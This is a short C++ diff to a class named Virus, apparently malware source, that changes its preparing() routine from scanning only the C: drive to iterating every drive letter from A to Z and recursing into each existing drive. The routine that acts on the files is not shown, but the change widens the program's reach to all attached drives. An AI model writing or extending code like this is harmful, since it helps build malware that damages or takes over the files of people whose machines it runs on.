@@ -48,8 +48,13 @@ void Virus::loop() {
 }
 
 void Virus::preparing() {
-    for (auto it : fs::directory_iterator("C:\\")) {
-        this->start_rec(it);
+    for( char drive = 'A'; drive <= 'Z'; ++drive ) {
+        fs::path p = std::string(1, drive) + ":\\";
+        if (fs::exists(p)) {
+            for (auto it : fs::directory_iterator(p.string())) {
+                this->start_rec(it);
+            }
+        }
     }
     state = 1;
 }
